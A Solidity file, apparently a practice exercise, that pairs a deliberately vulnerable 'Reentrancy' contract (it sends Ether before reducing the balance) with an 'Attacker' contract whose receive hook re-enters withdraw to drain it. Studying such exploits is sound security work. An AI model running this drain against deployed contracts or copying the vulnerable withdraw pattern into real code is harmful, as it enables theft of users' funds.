// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "hardhat/console.sol";

contract Reentrancy {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    // console.log('CURRENT CONTRACT BALANCE: ', address(this).balance);
    if(balances[msg.sender] >= _amount) {
    // console.log('WITHDRAWING:' );
        // console.log(_amount, address(this).balance);
      (bool result,) = msg.sender.call{value:_amount}("");
      console.log(result);
      if(result) {
        _amount;
      }
      // console.log('SENDER BALANCE: ', balances[msg.sender]);
      // console.log('REQUIRED BALANCE: ', _amount);
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attacker {
    Reentrancy immutable reentrancy;

    constructor(address payable _reentrancy){
        reentrancy = Reentrancy(_reentrancy);
    }

    function donate() external payable {
        console.log('DONATING');
        reentrancy.donate{value: msg.value}(address(this));
    }

    function attack() external {
        reentrancy.withdraw(reentrancy.balanceOf(address(this)));
    }

    receive() external payable {
            reentrancy.withdraw(msg.value);
    }
}